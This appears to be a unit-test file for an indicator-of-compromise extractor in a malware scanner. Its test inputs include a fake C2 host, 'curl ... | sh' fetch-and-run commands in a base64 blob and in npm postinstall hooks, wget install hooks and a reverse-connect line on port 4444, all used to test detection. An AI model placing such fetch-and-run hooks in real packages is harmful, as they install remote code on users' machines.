"""Unit tests for ioc_extractor.py. No network, no database, no real IOCs:
domains are invented, IPs are public DNS resolvers, tokens are repeated
characters, wallets are generated here or published test vectors.

    python3 -m unittest discover -s tests -t . -v
"""
import base64
import contextlib
import hashlib
import io
import json
import os
import tempfile
import unittest
from unittest import mock

import requests

import ioc_extractor as ioc

FAKE_DOMAIN = "maldet-fake-c2.xyz"
FAKE_URL = f"http://{FAKE_DOMAIN}/payload.bin"
FAKE_WEBHOOK = "https://discord.com/api/webhooks/" + "1" * 18 + "/" + "a" * 68
FAKE_TELEGRAM = "123456789:" + "A" * 35
FAKE_ETH = "0x" + "ab" * 20
BECH32_VECTOR = "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4"  # BIP-173 test vector


def fake_btc_address():
    """A checksum-valid address over a hash of a test string: nobody holds it."""
    payload = b"\x00" + hashlib.sha256(b"maldet test").digest()[:20]
    raw = payload + hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    number, text = int.from_bytes(raw, "big"), ""
    while number:
        number, rem = divmod(number, 58)
        text = ioc._B58[rem] + text
    return "1" * (len(raw) - len(raw.lstrip(b"\0"))) + text


def of_type(text, ioc_type):
    return {v for t, v in ioc.extract_from_text(text) if t == ioc_type}


class RegexTests(unittest.TestCase):
    def test_url(self):
        self.assertEqual(of_type(f'fetch("{FAKE_URL}")', "url"), {FAKE_URL})

    def test_url_strips_trailing_punctuation(self):
        self.assertEqual(of_type(f"see ({FAKE_URL}).", "url"), {FAKE_URL})

    def test_url_keeps_balanced_parenthesis(self):
        url = f"http://{FAKE_DOMAIN}/a_(b)"
        self.assertEqual(of_type(f"{url} ", "url"), {url})

    def test_url_lowercases_scheme_and_host_only(self):
        self.assertEqual(of_type(f"HTTP://{FAKE_DOMAIN.upper()}/PaTh", "url"),
                         {f"http://{FAKE_DOMAIN}/PaTh"})

    def test_url_placeholders_are_not_urls(self):
        for text in ("http://$HOST/x", "http://%s/x", "http://{host}/x", "http://<ip>/x"):
            self.assertEqual(of_type(text, "url"), set(), text)

    def test_url_also_yields_its_domain(self):
        self.assertIn(FAKE_DOMAIN, of_type(FAKE_URL, "domain"))

    def test_domain_bare(self):
        self.assertEqual(of_type(f"connect('{FAKE_DOMAIN}', 443)", "domain"), {FAKE_DOMAIN})

    def test_domain_ignores_code_and_filenames(self):
        text = ("logger.info('x'); rect.top; import foo.bar; open('setup.py'); README.md; "
                "main.cc; System.Net; self.app; os.path.join; request.data; thing.org.bar")
        self.assertEqual(of_type(text, "domain"), set())

    def test_domain_ignores_email_addresses(self):
        self.assertEqual(of_type(f"contact@{FAKE_DOMAIN}", "domain"), set())

    def test_ipv4(self):
        self.assertEqual(of_type("s.connect(('8.8.8.8', 4444))", "ipv4"), {"8.8.8.8"})

    def test_ipv4_rejects_invalid_octets_and_longer_dotted_runs(self):
        self.assertEqual(of_type("999.1.1.1 and 1.3.6.1.4.1.311", "ipv4"), set())

    def test_ipv4_from_url_host(self):
        self.assertEqual(of_type("http://8.8.4.4:8080/x", "ipv4"), {"8.8.4.4"})

    def test_discord_webhook(self):
        self.assertEqual(of_type(f"hook = '{FAKE_WEBHOOK}'", "discord_webhook"), {FAKE_WEBHOOK})

    def test_discord_webhook_is_not_also_a_url_or_domain(self):
        found = ioc.extract_from_text(FAKE_WEBHOOK)
        self.assertEqual(found, {("discord_webhook", FAKE_WEBHOOK)})

    def test_telegram_token(self):
        self.assertEqual(of_type(f"TOKEN='{FAKE_TELEGRAM}'", "telegram_bot_token"), {FAKE_TELEGRAM})

    def test_telegram_token_inside_bot_url(self):
        text = f"https://api.telegram.org/bot{FAKE_TELEGRAM}/sendMessage"
        self.assertEqual(of_type(text, "telegram_bot_token"), {FAKE_TELEGRAM})

    def test_btc_legacy_requires_a_valid_checksum(self):
        good = fake_btc_address()
        self.assertEqual(of_type(f"pay {good} now", "btc_wallet"), {good})
        last = "2" if good[-1] != "2" else "3"
        self.assertEqual(of_type(f"pay {good[:-1]}{last} now", "btc_wallet"), set())

    def test_btc_bech32_requires_a_valid_checksum(self):
        self.assertEqual(of_type(f"pay {BECH32_VECTOR}", "btc_wallet"), {BECH32_VECTOR})
        broken = BECH32_VECTOR[:-1] + ("q" if BECH32_VECTOR[-1] != "q" else "p")
        self.assertEqual(of_type(f"pay {broken}", "btc_wallet"), set())

    def test_eth_wallet(self):
        self.assertEqual(of_type(f"to={FAKE_ETH};", "eth_wallet"), {FAKE_ETH})

    def test_eth_wallet_lowercased_for_dedupe(self):
        self.assertEqual(of_type("0x" + "AB" * 20, "eth_wallet"), {FAKE_ETH})

    def test_eth_zero_address_is_a_constant(self):
        self.assertEqual(of_type("0x" + "0" * 40, "eth_wallet"), set())


class NoiseFilterTests(unittest.TestCase):
    def test_safe_domains_and_subdomains(self):
        for host in ("github.com", "raw.githubusercontent.com", "pypi.org", "www.example.com",
                     "registry.npmjs.org", "docs.python.org", "foo.readthedocs.io", "www.w3.org",
                     "www.apache.org", "developer.mozilla.org", "storage.googleapis.com",
                     "example.net", "example.org", "www.npmjs.com", "localhost"):
            self.assertTrue(ioc.is_safe_domain(host), host)

    def test_safe_match_is_on_a_label_boundary(self):
        for host in ("github.com.maldet-fake.xyz", "notgithub.com", "fakepypi.org"):
            self.assertFalse(ioc.is_safe_domain(host), host)

    def test_safe_urls_produce_nothing(self):
        text = ("https://github.com/a/b https://raw.githubusercontent.com/a/b/c "
                "https://pypi.org/simple http://www.w3.org/2000/svg http://localhost:5000/ "
                "https://example.com/x https://foo.test/x")
        self.assertEqual(ioc.extract_from_text(text), set())

    def test_non_public_ips_are_ignored(self):
        for ip in ("10.0.0.1", "172.16.0.1", "192.168.1.1", "127.0.0.1", "169.254.169.254",
                   "0.0.0.0", "100.64.0.1", "192.0.2.1", "198.51.100.7", "203.0.113.9",
                   "224.0.0.1", "239.255.255.250", "240.0.0.1", "255.255.255.255"):
            self.assertFalse(ioc.is_public_ipv4(ip), ip)
            self.assertEqual(of_type(f"connect {ip} now", "ipv4"), set(), ip)
        self.assertTrue(ioc.is_public_ipv4("8.8.8.8"))

    def test_version_strings_are_not_ips(self):
        for text in ('version="1.2.3.4"', "version = '8.8.8.8'", '__version__ = "8.8.4.4"',
                     "VERSION: 8.8.8.8", "<Version>8.8.8.8</Version>", 'AssemblyVersion("8.8.8.8")',
                     "v8.8.8.8", "foo==8.8.8.8", "foo>=8.8.8.8", "foo~=8.8.8.8", "8.8.8.8-beta",
                     "release 8.8.8.8", "build_number=8.8.8.8"):
            self.assertEqual(of_type(text, "ipv4"), set(), text)

    def test_version_check_does_not_swallow_real_hosts(self):
        for text in ("server=8.8.8.8", "host = '8.8.8.8'", "build_host=8.8.8.8", "driver: 8.8.8.8",
                     "ip=8.8.8.8", "version=1\nhost=8.8.8.8"):
            self.assertEqual(of_type(text, "ipv4"), {"8.8.8.8"}, text)


class Base64Tests(unittest.TestCase):
    @staticmethod
    def encoded(text):
        return base64.b64encode(text.encode()).decode()

    def test_url_inside_base64(self):
        blob = self.encoded(f"curl {FAKE_URL} | sh  # padding padding padding")
        self.assertGreater(len(blob), 40)
        self.assertIn(("url", FAKE_URL), ioc.extract_from_text(f"exec(b64decode('{blob}'))"))

    def test_ip_inside_base64(self):
        blob = self.encoded("connect back to host 8.8.8.8 on port 4444 please")
        self.assertIn(("ipv4", "8.8.8.8"), ioc.extract_from_text(blob))

    def test_only_urls_and_ips_come_out_of_decoded_text(self):
        blob = self.encoded(f"{FAKE_TELEGRAM} {FAKE_ETH} padding padding padding")
        self.assertEqual(ioc.extract_from_text(f"x='{blob}'"), set())

    def test_short_strings_are_left_alone(self):
        blob = self.encoded("http://a.xyz/")
        self.assertLessEqual(len(blob), 40)
        self.assertEqual(ioc.decode_base64_strings(blob), [])

    def test_exactly_40_chars_is_not_decoded_over_40_is(self):
        self.assertEqual(ioc.decode_base64_strings(self.encoded("a" * 30)), [])  # 40 chars
        self.assertEqual(len(ioc.decode_base64_strings(self.encoded("a" * 31))), 1)  # 44 chars

    def test_binary_payload_is_ignored(self):
        blob = base64.b64encode(bytes(range(256))).decode()
        self.assertEqual(ioc.decode_base64_strings(blob), [])

    def test_long_identifier_is_not_mistaken(self):
        self.assertEqual(ioc.extract_from_text("A" * 400), set())


class DedupeTests(unittest.TestCase):
    def test_same_type_and_value_is_one_row_with_a_count(self):
        c = ioc.IocCollector()
        c.add("url", FAKE_URL, "/b.py")
        c.add("url", FAKE_URL, "/a.py")
        c.add("url", FAKE_URL, "/a.py")
        rows = c.rows()
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["file_count"], 2)
        self.assertEqual(rows[0]["file_path"], "/a.py")

    def test_same_value_different_type_stays_separate(self):
        c = ioc.IocCollector()
        c.add("domain", FAKE_DOMAIN, "/a.py")
        c.add("url", FAKE_DOMAIN, "/a.py")
        self.assertEqual(len(c.rows()), 2)

    def test_cap_marks_truncation(self):
        c = ioc.IocCollector(limit=1)
        c.add("domain", "a.xyz", "/a")
        c.add("domain", "a.xyz", "/b")
        self.assertFalse(c.truncated)
        c.add("domain", "b.xyz", "/a")
        self.assertTrue(c.truncated)
        self.assertEqual(len(c.rows()), 1)

    def test_over_long_value_is_dropped_not_truncated(self):
        c = ioc.IocCollector()
        c.add("url", "http://a.xyz/" + "x" * ioc.MAX_VALUE_CHARS, "/a")
        self.assertEqual(c.rows(), [])


class InstallScriptTests(unittest.TestCase):
    def test_pyproject_metadata_is_skipped(self):
        source = """
[project]
name = "demo"
version = "8.8.8.8"
urls = {Homepage = "https://demo-project.xyz/", Chat = "https://discord.gg/demo"}
authors = [{name = "A", email = "a@demo-project.xyz"}]
dependencies = ["evil @ http://maldet-fake-c2.xyz/evil.whl"]
[tool.poetry]
homepage = "https://demo-project.xyz/"
"""
        found = ioc.extract_from_text(ioc.install_script_text("pyproject.toml", source))
        self.assertEqual(found, {("url", "http://maldet-fake-c2.xyz/evil.whl"),
                                 ("domain", FAKE_DOMAIN)})

    def test_setup_py_metadata_comments_and_docstrings_are_skipped(self):
        source = f'''"""See https://demo-project.xyz/about"""
# https://demo-project.xyz/comment
from setuptools import setup
import urllib.request
urllib.request.urlopen("{FAKE_URL}")
setup(name="demo", version="8.8.8.8", url="https://demo-project.xyz/",
      project_urls={{"Docs": "https://demo-project.xyz/docs"}},
      author_email="a@demo-project.xyz")
'''
        found = ioc.extract_from_text(ioc.install_script_text("setup.py", source))
        self.assertEqual(found, {("url", FAKE_URL), ("domain", FAKE_DOMAIN)})

    def test_setup_py_is_never_executed(self):
        marker = os.path.join(tempfile.gettempdir(), f"maldet-ioc-test-{os.getpid()}")
        source = f"open({marker!r}, 'w').close()\nsetup(name='x')\n"
        ioc.install_script_text("setup.py", source)
        self.assertFalse(os.path.exists(marker))

    def test_python2_setup_py_falls_back_without_metadata(self):
        source = f'print "hi"\nsetup(\n  url="https://demo-project.xyz/",\n)\nurlopen("{FAKE_URL}")\n'
        found = ioc.extract_from_text(ioc.install_script_text("setup.py", source))
        self.assertEqual(found, {("url", FAKE_URL), ("domain", FAKE_DOMAIN)})

    def test_setup_cfg_metadata_section_is_skipped(self):
        source = ("[metadata]\nurl = https://demo-project.xyz/\n"
                  f"[options]\ninstall_requires =\n  evil @ {FAKE_URL}\n")
        found = ioc.extract_from_text(ioc.install_script_text("setup.cfg", source))
        self.assertEqual(found, {("url", FAKE_URL), ("domain", FAKE_DOMAIN)})

    def test_package_json_only_reads_install_hooks(self):
        source = json.dumps({
            "homepage": "https://demo-project.xyz/",
            "scripts": {"test": "curl https://demo-test.xyz/", "postinstall": f"curl {FAKE_URL} | sh"},
        })
        found = ioc.extract_from_text(ioc.install_script_text("package.json", source))
        self.assertEqual(found, {("url", FAKE_URL), ("domain", FAKE_DOMAIN)})

    def test_every_install_hook_is_read(self):
        for hook in ("preinstall", "install", "postinstall"):
            source = json.dumps({"scripts": {hook: f"wget {FAKE_URL}"}})
            self.assertIn(FAKE_URL, ioc.install_script_text("package.json", source))

    def test_broken_package_json_is_harmless(self):
        self.assertEqual(ioc.install_script_text("package.json", "{nope"), "")
        self.assertEqual(ioc.install_script_text("package.json", "[1,2]"), "")


class ExtractIocsTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = self._tmp.name

    def write(self, rel, content, mode="w"):
        full = os.path.join(self.root, rel)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, mode) as handle:
            handle.write(content)
        return full

    @staticmethod
    def flag(rel, tool="yara"):
        return {"tool": tool, "filename": rel}

    @staticmethod
    def values(result, ioc_type):
        return {r["value"] for r in result["iocs"] if r["ioc_type"] == ioc_type}

    def test_flagged_file_is_hashed_and_searched(self):
        self.write("evil.py", f"urlopen('{FAKE_URL}')")
        result = ioc.extract_iocs(self.root, [self.flag("/evil.py", "clamav")])
        digest = hashlib.sha256(f"urlopen('{FAKE_URL}')".encode()).hexdigest()
        self.assertEqual(self.values(result, "sha256"), {digest})
        self.assertEqual(self.values(result, "url"), {FAKE_URL})
        self.assertEqual(result["status"], "done")

    def test_unflagged_ordinary_files_are_not_read(self):
        self.write("app.py", f"urlopen('{FAKE_URL}')")
        result = ioc.extract_iocs(self.root, [self.flag("/app.py", "bandit")])
        self.assertEqual(result["iocs"], [])

    def test_install_scripts_are_read_without_being_flagged_and_not_hashed(self):
        self.write("setup.py", f"urlopen('{FAKE_URL}')\nsetup(name='x')")
        result = ioc.extract_iocs(self.root, [])
        self.assertEqual(self.values(result, "url"), {FAKE_URL})
        self.assertEqual(self.values(result, "sha256"), set())

    def test_nested_and_ignored_install_scripts(self):
        self.write("pkg/setup.py", f"urlopen('{FAKE_URL}')")
        self.write("tests/setup.py", "urlopen('http://only-in-tests.xyz/')")
        self.write("node_modules/x/setup.py", "urlopen('http://only-in-modules.xyz/')")
        result = ioc.extract_iocs(self.root, [], is_ignored=lambda p: "/tests/" in p)
        self.assertEqual(self.values(result, "url"), {FAKE_URL})
        self.assertEqual(result["iocs"][0]["file_path"], "/pkg/setup.py")

    def test_ignored_flagged_paths_are_skipped(self):
        self.write("tests/evil.py", f"urlopen('{FAKE_URL}')")
        result = ioc.extract_iocs(self.root, [self.flag("/tests/evil.py")],
                                  is_ignored=lambda p: "tests" in p)
        self.assertEqual(result["iocs"], [])

    def test_binary_is_hashed_but_not_searched(self):
        self.write("evil.bin", b"\0\0" + FAKE_URL.encode(), "wb")
        result = ioc.extract_iocs(self.root, [self.flag("/evil.bin")])
        self.assertEqual(len(self.values(result, "sha256")), 1)
        self.assertEqual(self.values(result, "url"), set())

    def test_file_over_2mb_is_hashed_but_not_searched(self):
        self.write("big.js", FAKE_URL + " " + "x" * (ioc.MAX_TEXT_BYTES + 1))
        result = ioc.extract_iocs(self.root, [self.flag("/big.js")])
        self.assertEqual(len(self.values(result, "sha256")), 1)
        self.assertEqual(self.values(result, "url"), set())

    def test_symlink_is_refused(self):
        with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as outside:
            outside.write(f"SECRET_HOST = '{FAKE_URL}'")
        self.addCleanup(os.unlink, outside.name)
        os.symlink(outside.name, os.path.join(self.root, "setup.py"))
        os.symlink(outside.name, os.path.join(self.root, "evil.py"))
        result = ioc.extract_iocs(self.root, [self.flag("/evil.py")])
        self.assertEqual(result["iocs"], [])

    def test_symlinked_directory_is_refused(self):
        with tempfile.TemporaryDirectory() as outside:
            with open(os.path.join(outside, "evil.py"), "w") as handle:
                handle.write(f"x = '{FAKE_URL}'")
            os.symlink(outside, os.path.join(self.root, "linked"))
            result = ioc.extract_iocs(self.root, [self.flag("/linked/evil.py")])
        self.assertEqual(result["iocs"], [])

    def test_path_escaping_the_clone_is_refused(self):
        with tempfile.NamedTemporaryFile("w", dir=os.path.dirname(self.root), delete=False) as outside:
            outside.write(FAKE_URL)
        self.addCleanup(os.unlink, outside.name)
        rel = "/../" + os.path.basename(outside.name)
        result = ioc.extract_iocs(self.root, [self.flag(rel)])
        self.assertEqual(result["iocs"], [])

    def test_fifo_does_not_hang(self):
        os.mkfifo(os.path.join(self.root, "pipe"))
        result = ioc.extract_iocs(self.root, [self.flag("/pipe")])
        self.assertEqual(result["iocs"], [])

    def test_same_value_in_two_files_dedupes(self):
        self.write("a.py", FAKE_URL)
        self.write("b.py", FAKE_URL)
        result = ioc.extract_iocs(self.root, [self.flag("/a.py"), self.flag("/b.py"),
                                              self.flag("/a.py", "clamav")])
        row_ = next(r for r in result["iocs"] if r["ioc_type"] == "url")
        self.assertEqual((row_["file_path"], row_["file_count"]), ("/a.py", 2))

    def test_incomplete_marker_has_no_file_and_is_harmless(self):
        result = ioc.extract_iocs(self.root, [{"tool": "yara", "filename": ""}])
        self.assertEqual(result["iocs"], [])

    def test_time_limit_reports_partial_rather_than_clean(self):
        self.write("a.py", FAKE_URL)
        result = ioc.extract_iocs(self.root, [self.flag("/a.py")], time_limit=-1)
        self.assertEqual(result["status"], "partial")
        self.assertIn("time limit", result["note"])

    def test_time_limit_comes_from_the_environment(self):
        self.write("a.py", FAKE_URL)
        with mock.patch.dict(os.environ, {"MALDET_IOC_TIMEOUT": "-1"}):
            result = ioc.extract_iocs(self.root, [self.flag("/a.py")])
        self.assertEqual(result["status"], "partial")


class FakeResponse:
    def __init__(self, body=None, status=200):
        self.status_code = status
        self._body = body

    def json(self):
        if self._body is None:
            raise ValueError("no json")
        return self._body


def row(ioc_type, value):
    return {"ioc_type": ioc_type, "value": value, "file_path": "/a.py", "file_count": 1,
            "ti_match": None, "ti_source": None}


class ThreatIntelTests(unittest.TestCase):
    KEY = "test-key-not-real"

    def test_no_key_skips_without_any_request(self):
        with mock.patch.object(ioc.requests, "post") as post, \
             mock.patch.dict(os.environ, {"ABUSECH_AUTH_KEY": ""}):
            self.assertEqual(ioc.enrich_with_threat_intel([row("url", FAKE_URL)]), "off")
        post.assert_not_called()

    def test_key_is_read_from_environment_and_sent_as_header(self):
        response = FakeResponse({"query_status": "no_results"})
        with mock.patch.object(ioc.requests, "post", return_value=response) as post, \
             mock.patch.dict(os.environ, {"ABUSECH_AUTH_KEY": self.KEY}):
            self.assertEqual(ioc.enrich_with_threat_intel([row("url", FAKE_URL)]), "done")
        self.assertEqual(post.call_args.kwargs["headers"], {"Auth-Key": self.KEY})
        self.assertLessEqual(post.call_args.kwargs["timeout"], ioc.TI_REQUEST_TIMEOUT)

    def test_malwarebazaar_match(self):
        rows = [row("sha256", "a" * 64)]
        response = FakeResponse({"query_status": "ok", "data": [{"signature": "FakeFamily"}]})
        with mock.patch.object(ioc.requests, "post", return_value=response) as post:
            self.assertEqual(ioc.enrich_with_threat_intel(rows, key=self.KEY), "done")
        self.assertEqual(post.call_args.args[0], ioc.MALWAREBAZAAR_API)
        self.assertEqual(post.call_args.kwargs["data"], {"query": "get_info", "hash": "a" * 64})
        self.assertEqual((rows[0]["ti_match"], rows[0]["ti_source"]), ("FakeFamily", "MalwareBazaar"))

    def test_urlhaus_match(self):
        rows = [row("url", FAKE_URL)]
        response = FakeResponse({"query_status": "ok", "threat": "malware_download", "url_status": "offline"})
        with mock.patch.object(ioc.requests, "post", return_value=response) as post:
            ioc.enrich_with_threat_intel(rows, key=self.KEY)
        self.assertEqual(post.call_args.args[0], ioc.URLHAUS_API)
        self.assertEqual(post.call_args.kwargs["data"], {"url": FAKE_URL})
        self.assertEqual((rows[0]["ti_match"], rows[0]["ti_source"]),
                         ("malware_download (offline)", "URLhaus"))

    def test_not_found_is_no_match(self):
        rows = [row("sha256", "a" * 64)]
        response = FakeResponse({"query_status": "hash_not_found"})
        with mock.patch.object(ioc.requests, "post", return_value=response):
            self.assertEqual(ioc.enrich_with_threat_intel(rows, key=self.KEY), "done")
        self.assertIsNone(rows[0]["ti_match"])

    def test_only_hashes_and_urls_are_sent(self):
        rows = [row("domain", FAKE_DOMAIN), row("ipv4", "8.8.8.8"), row("telegram_bot_token", FAKE_TELEGRAM)]
        with mock.patch.object(ioc.requests, "post") as post:
            self.assertEqual(ioc.enrich_with_threat_intel(rows, key=self.KEY), "done")
        post.assert_not_called()

    def test_network_failure_does_not_raise_and_says_failed(self):
        rows = [row("url", FAKE_URL)]
        with mock.patch.object(ioc.requests, "post", side_effect=requests.Timeout()):
            self.assertEqual(ioc.enrich_with_threat_intel(rows, key=self.KEY), "failed")
        self.assertIsNone(rows[0]["ti_match"])

    def test_mixed_failure_is_partial(self):
        rows = [row("url", FAKE_URL), row("url", FAKE_URL + "2")]
        side = [FakeResponse({"query_status": "no_results"}), FakeResponse(status=500)]
        with mock.patch.object(ioc.requests, "post", side_effect=side):
            self.assertEqual(ioc.enrich_with_threat_intel(rows, key=self.KEY), "partial")

    def test_bad_json_is_a_failed_lookup(self):
        with mock.patch.object(ioc.requests, "post", return_value=FakeResponse(None)):
            self.assertEqual(ioc.enrich_with_threat_intel([row("url", FAKE_URL)], key=self.KEY), "failed")

    def test_rejected_key_stops_and_is_never_printed(self):
        rows = [row("url", FAKE_URL), row("url", FAKE_URL + "2")]
        out = io.StringIO()
        with mock.patch.object(ioc.requests, "post", return_value=FakeResponse(status=401)) as post, \
             contextlib.redirect_stdout(out):
            status = ioc.enrich_with_threat_intel(rows, key=self.KEY)
        self.assertEqual(status, "failed")
        self.assertEqual(post.call_count, 1)
        self.assertNotIn(self.KEY, out.getvalue())

    def test_lookup_cap_reports_partial(self):
        rows = [row("url", f"{FAKE_URL}{i}") for i in range(ioc.TI_MAX_LOOKUPS + 1)]
        response = FakeResponse({"query_status": "no_results"})
        with mock.patch.object(ioc.requests, "post", return_value=response) as post:
            self.assertEqual(ioc.enrich_with_threat_intel(rows, key=self.KEY), "partial")
        self.assertEqual(post.call_count, ioc.TI_MAX_LOOKUPS)

    def test_spent_budget_makes_no_request(self):
        with mock.patch.object(ioc.requests, "post") as post:
            status = ioc.enrich_with_threat_intel([row("url", FAKE_URL)], key=self.KEY, time_budget=-1)
        self.assertEqual(status, "failed")
        post.assert_not_called()

    def test_findings_only_for_matches_in_the_standard_shape(self):
        match = row("sha256", "a" * 64)
        match.update(ti_match="FakeFamily", ti_source="MalwareBazaar")
        findings = ioc.threat_intel_findings([match, row("url", FAKE_URL)])
        self.assertEqual(len(findings), 1)
        self.assertEqual(set(findings[0]), {"tool", "severity", "issue_text", "filename",
                                            "line_number", "code_snippet"})
        self.assertEqual(findings[0]["tool"], "threat_intel")
        self.assertTrue(findings[0]["issue_text"].startswith("MalwareBazaar"))


if __name__ == "__main__":
    unittest.main()
